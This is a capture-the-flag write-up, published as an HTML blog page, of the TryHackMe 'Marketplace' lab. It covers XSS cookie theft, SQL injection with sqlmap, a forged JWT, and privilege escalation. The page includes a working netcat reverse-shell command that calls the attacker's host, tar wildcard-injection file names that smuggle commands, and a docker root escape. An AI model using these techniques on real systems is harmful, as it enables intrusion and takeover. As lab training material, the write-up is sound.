@@ -1,0 +1,523 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>THM: The Marketplace</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">THM: The Marketplace</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org8e18132">Reconnaisance</a>
+<ul>
+<li><a href="#orgfa99dcb">Web Analysis</a>
+<ul>
+<li><a href="#orgc2b8439">Creating a <code>test</code> user</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#org1a0156a">XSS Exploitation</a></li>
+<li><a href="#orgc497c09">SQL Injection</a></li>
+<li><a href="#org249b788">Privilege escalation</a></li>
+<li><a href="#org0da093c">Conclusion</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org8e18132" class="outline-2">
+<h2 id="org8e18132"><a href="#org8e18132">Reconnaisance</a></h2>
+<div class="outline-text-2" id="text-org8e18132">
+<p>
+Running a quick <code>nmap</code> scan to get some initial information on the
+target system:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org44beb34">nmap -sV -sC -oN nmap.initial 10.10.146.88
+</pre>
+</div>
+
+<p>
+It gives us lot&rsquo;s of information:
+</p>
+<pre class="example" id="orgb08417d">
+Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
+Host is up (0.00021s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
+|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
+|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (EdDSA)
+80/tcp    open  http    nginx 1.19.2
+| http-robots.txt: 1 disallowed entry
+|_/admin
+|_http-server-header: nginx/1.19.2
+|_http-title: The Marketplace
+32768/tcp open  http    Node.js (Express middleware)
+| http-robots.txt: 1 disallowed entry
+|_/admin
+|_http-title: The Marketplace
+MAC Address: 02:3C:29:73:B9:79 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>
+First things first, the target machine runs an ssh and (at least) one
+http server. After going for some web enumeration, I started this
+<i>fuller</i> scan, to check whether I had missed something with the previous
+one.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="org9dd5dd9">nmap -p- -T4 10.10.146.88 | tee nmap.full
+</pre>
+</div>
+
+<p>
+It&rsquo;s output was the same:
+</p>
+<pre class="example" id="org88296f3">
+Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
+Host is up (0.00040s latency).
+Not shown: 65532 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+32768/tcp open  filenet-tms
+MAC Address: 02:3C:29:73:B9:79 (Unknown)
+</pre>
+</div>
+
+<div id="outline-container-orgfa99dcb" class="outline-3">
+<h3 id="orgfa99dcb"><a href="#orgfa99dcb">Web Analysis</a></h3>
+<div class="outline-text-3" id="text-orgfa99dcb">
+<p>
+I checked for <code>robots.txt, security.txt, sitemap.xml</code> files, out of
+which only the first existed, without much information available to us:
+</p>
+
+<div id="orgcb5564a" class="figure">
+<p><img src="Reconnaisance/20231022_185121_screenshot.png" alt="20231022_185121_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 1: </span>Robots.txt contents</p>
+</div>
+
+<p>
+Then, I ran <code>gobuster</code> while manually checking the website out:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org39af356">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.146.88 | tee gobuster.bigtxt
+</pre>
+</div>
+
+<p>
+Its output was not much
+</p>
+<pre class="example" id="org96dd20f">
+==============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.146.88
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2023/10/22 16:58:58 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/ADMIN (Status: 403)
+/Admin (Status: 403)
+/Login (Status: 200)
+/admin (Status: 403)
+/images (Status: 301)
+/login (Status: 200)
+/messages (Status: 302)
+/new (Status: 302)
+/robots.txt (Status: 200)
+/signup (Status: 200)
+/stylesheets (Status: 301)
+===============================================================
+2023/10/22 16:59:32 Finished
+=========================================================
+</pre>
+</div>
+
+<div id="outline-container-orgc2b8439" class="outline-4">
+<h4 id="orgc2b8439"><a href="#orgc2b8439">Creating a <code>test</code> user</a></h4>
+<div class="outline-text-4" id="text-orgc2b8439">
+<p>
+Since the site was way too simple (I think about 4 almost blank
+pages), I created a <code>test</code> user to see what extra functionality logging
+in offered:
+</p>
+
+
+<div id="orgbc3a4c2" class="figure">
+<p><img src="Reconnaisance/20231022_190304_screenshot.png" alt="20231022_190304_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 2: </span>Allowing for new listings and messages(!)</p>
+</div>
+
+<p>
+At this point I&rsquo;m thinking that a Blind XSS might be the way to go.
+</p>
+
+<p>
+In the new listings page we get that no file may be uploaded <b>due to
+security issues</b>. That&rsquo;s not really a problem
+</p>
+
+
+<div id="org8af4e98" class="figure">
+<p><img src="Reconnaisance/20231022_190913_screenshot.png" alt="20231022_190913_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 3: </span>New listings page</p>
+</div>
+
+
+<p>
+I then created a listing with a sample XSS payload for proof of
+concept. It worked fine.
+</p>
+
+
+<div id="orgab8b351" class="figure">
+<p><img src="Reconnaisance/20231022_191002_screenshot.png" alt="20231022_191002_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 4: </span>Creating a new listing</p>
+</div>
+
+
+
+
+
+<div id="org4b270c6" class="figure">
+<p><img src="Reconnaisance/20231022_191112_screenshot.png" alt="20231022_191112_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 5: </span>Working XSS <code>alert(1)</code> payload</p>
+</div>
+
+<p>
+The problem, however, is that this is not enough. Ideally, I would
+have to use an actual payload on a page that would be viewed by the
+admins: These two buttons might be helpful for that, but for the time
+being, checking the website&rsquo;s cookies seems equally promising
+</p>
+
+
+<div id="org9559370" class="figure">
+<p><img src="Reconnaisance/20231022_191849_screenshot.png" alt="20231022_191849_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 6: </span>Way to contact PPL (pun intended)</p>
+</div>
+
+<p>
+The cookie is of the typical form:
+</p>
+<pre class="example" id="org3a5179d">
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VySWQiOjYsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjk3OTkwMTQ4fQNxRVUKaYnmQAxWMchI-rMWA2C0FFOx-XXXdtV20Xe04
+</pre>
+<p>
+which, after decoding (it obviously is base64 encoded) reveals its
+three parts:
+</p>
+<pre class="example" id="org6c09c9a">
+{"alg":"HS256","typ":"JWT"}
+{"userId":6,"username":"test","admin":false,"iat":1697990148}
+qEU i@V1H`Suvvw
+</pre>
+
+<p>
+At this point I could try crafting a cookie like this:
+</p>
+<pre class="example" id="orgfe832c4">
+{"alg":"none","typ":"JWT"}
+{"userId":0,"username":"admin","admin":true,"iat":1697990148}
+
+</pre>
+
+<p>
+However, I do not know the username associated with ID:0, and I know
+for a fact that <code>admin</code> user does not exists (I tried creating a user
+<code>&lt;space&gt;admin</code>, hoping that would get me somewhere)
+</p>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org1a0156a" class="outline-2">
+<h2 id="org1a0156a"><a href="#org1a0156a">XSS Exploitation</a></h2>
+<div class="outline-text-2" id="text-org1a0156a">
+<p>
+I first created a listing that would get me the cookie of anyone
+viewing it:
+</p>
+
+<div id="orgdffc473" class="figure">
+<p><img src="XSS_Exploitation/20231022_193437_screenshot.png" alt="20231022_193437_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 7: </span>Malicious listing</p>
+</div>
+
+<p>
+I, then tested it on myself, and it worked just fine, so I proceeded
+reporting it to the admins and hoping that someone would view it. It
+did not disappoint.
+</p>
+
+<p>
+When I got back from my water break, a cookie was waiting for me!!
+</p>
+
+<div id="org6490f3e" class="figure">
+<p><img src="XSS_Exploitation/20231022_193832_screenshot.png" alt="20231022_193832_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 8: </span>Admin&rsquo;s cookieeeeeee!</p>
+</div>
+
+<p>
+I used it and logged into the <code>/admin</code> page: The first flag was waiting
+for me there !
+</p>
+
+
+<div id="orga536ec6" class="figure">
+<p><img src="XSS_Exploitation/20231022_194020_screenshot.png" alt="20231022_194020_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 9: </span>We&rsquo;re getting somewhere.</p>
+</div>
+
+<p>
+We see now that :
+</p>
+<ul class="org-ul">
+<li>There are two administrators (users 4 and 5 are my creation :P),
+<code>jake</code> and <code>michael</code>. Ideally we would find a way to log in as either
+one, through SSH to the target machine.</li>
+<li>I can not give admin rights, I can only delete accounts.</li>
+<li>The admin&rsquo;s messages are empty, so there is unfortunately no secret
+password there.</li>
+</ul>
+
+<p>
+I got stuck here, the only two options I&rsquo;m thinking of are:
+</p>
+<ol class="org-ol">
+<li>Trying to bruteforce one of the two admin accounts</li>
+<li>Hoping for a known vulnerability of either <code>nginx</code> or <code>node.jear</code></li>
+</ol>
+
+<p>
+Avoiding bruteforce when another option is possible, I opted for 2.
+</p>
+<ul class="org-ul">
+<li>Though I found some vulnerabilities, potentially useful under
+different circumstances, for <code>nginx 1.19.2</code>, no exploit was readily
+available on exploit-db, and I doubt that a medium difficulty room
+would require me to develop my own exploit.</li>
+<li>I could not find any information on <code>node.js</code> however. If any reader
+has any suggestions for this part, I would love to hear them.</li>
+</ul>
+
+<p>
+Seems like 1 is sadly the way to go&#x2026; It was not. (I did not like
+that option, and I was just sure I had missed something, so I searched
+for a writeup online, I had overlooked an SQL Injection entry point)
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgc497c09" class="outline-2">
+<h2 id="orgc497c09"><a href="#orgc497c09">SQL Injection</a></h2>
+<div class="outline-text-2" id="text-orgc497c09">
+<p>
+More specifically, when selecting a user in the administration panel,
+the website would point us to <code>/admin?user=1</code>, which after testing with
+the old classic <code>' OR 1=1;--</code>, shows an error:
+</p>
+
+
+<div id="orgf2e9c09" class="figure">
+<p><img src="SQL_Injection/20231022_200202_screenshot.png" alt="20231022_200202_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 10: </span>SQL Error</p>
+</div>
+
+<p>
+Seeing that an SQLi could be beneficial, I used <code>sqlmap</code>:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="orga05e124">sqlmap -u http://10.10.146.88/admin?<span class="org-variable-name">user</span>=1 --batch
+</pre>
+</div>
+
+<p>
+It provided no output, and I did not like it, so I checked the output
+for any hints why that happened. Immediately <code>HTTP error code 403</code>
+hinted the obvious: I had not taken advantage of my admin cookie.
+</p>
+
+<p>
+Even after putting my cookie on, however, the problem persisted, and
+even caused the cookie to be renewed, and no longer valid. It took
+some tinkering for me to realize (through experimentation) that the
+problem was in the sheer volume of my requests, and adding <code>--delay=2</code>
+eventually fixed the problem:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="org84d5961">sqlmap --url=<span class="org-string">'http://10.10.146.88/admin?user=1'</span> --cookie=<span class="org-string">'token=DATOKEN'</span> --technique=U --delay=2 --dump
+</pre>
+</div>
+
+<p>
+Important notice: make sure to renew your attack box&rsquo;s timer every now
+and then especially if you take breaks to tidy up the house while a
+script is running. I did not, and lost all the output of sqlmap, on
+the very first time it actually worked.
+</p>
+
+
+<p>
+Long story short, we get some really nice data through <code>sqlmap</code>, but the
+most important is hidden in a message there: we get the password for <code>jake</code>
+</p>
+
+<p>
+And after logging in we get the second flag:
+</p>
+
+<div id="org7ed0ec6" class="figure">
+<p><img src="SQL_Injection/20231022_205347_screenshot.png" alt="20231022_205347_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 11: </span>The second flag</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org249b788" class="outline-2">
+<h2 id="org249b788"><a href="#org249b788">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-org249b788">
+<p>
+Knowing that the last flag is a file called <code>root.txt</code> I used <code>find</code>
+hoping its output to show me its location. No luck though.
+</p>
+
+<p>
+Next step was to check what I can <code>sudo</code>:
+</p>
+<ul class="org-ul">
+<li><code>sudo -l</code> show that I can run a specific file as sudo without password</li>
+<li>After inspecting it becomes relatively obvious that what I want now
+is to use a properly named file to mess with the <code>tar cf
+  /opt/backups/backup.tar *</code> command that runs within that script. I
+did not remember exactly how, but a little bit of googling saved the
+day: (<a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/</a>)</li>
+</ul>
+
+<p>
+I created a directory and worked in it (<code>wrk</code>), but it is not necessary.
+In fact, this will work anywhere!
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="orgf291b97"><span class="org-builtin">echo</span> <span class="org-string">"rm -f /tmp/lhennp;mkfifo /tmp/lhennp; nc 10.10.199.235 6969 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp"</span> &gt; shell.sh
+<span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; <span class="org-string">"--checkpoint-action=exec=sh shell.sh"</span>
+<span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; --checkpoint=1
+</pre>
+</div>
+
+<p>
+Please do not make the mistake of running the command as is :P. Run it
+as michael with:j
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org4634f54">sudo -u michael /opt/backups/backup.sh 
+</pre>
+</div>
+
+<p>
+Finally we get the rev shell, and make it work a little bit better
+with some python:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org716a6be">python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
+</pre>
+</div>
+
+<p>
+The thing is that <code>michael</code> does not give us any advantage that <code>jake</code>
+does not have. If anything, michael can not even run <code>sudo -l</code> without a
+password! Browsing through my privesc notes, I saw a hint about <code>id</code>
+which showed that <code>michael</code> is a member of the <code>docker</code> group
+</p>
+
+<p>
+Listing the docker running instances got me thinking of using them to
+get root privileges, which actually worked using the second command,
+found in <a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a>
+</p>
+<div class="org-src-container">
+<pre class="src src-bash" id="org9af7706">docker ps
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-bash" id="orgacfdb6f">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</pre>
+</div>
+
+<p>
+After becoming root there was nothing else to do. It was finally over. 
+</p>
+
+
+<div id="org8322be6" class="figure">
+<p><img src="Privilege_escalation/20231022_212928_screenshot.png" alt="20231022_212928_screenshot.png" />
+</p>
+<p><span class="figure-number">Figure 12: </span>THE END</p>
+</div>
+</div>
+</div>
+
+
+<div id="outline-container-org0da093c" class="outline-2">
+<h2 id="org0da093c"><a href="#org0da093c">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org0da093c">
+<p>
+I liked the room, a lot and it was on a good level for me to try and
+complete, being neither too easy nor too hard. Not noticing the SQL
+injection is something I plan to work on, and I am not satisfied with
+my performance in the post-exploitation stage, getting stuck before
+using the <code>id</code> command, but this is part of learning so&#x2026; C&rsquo;est la vie.  
+</p>
+
+<div class="tenor-gif-embed" data-postid="23474613" data-share-method="host" data-aspect-ratio="1.73913" data-width="100%"><a href="https://tenor.com/view/luffy-gif-23474613">Luffy GIF</a>from <a href="https://tenor.com/search/luffy-gifs">Luffy GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-10-22 Sun 18:31 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
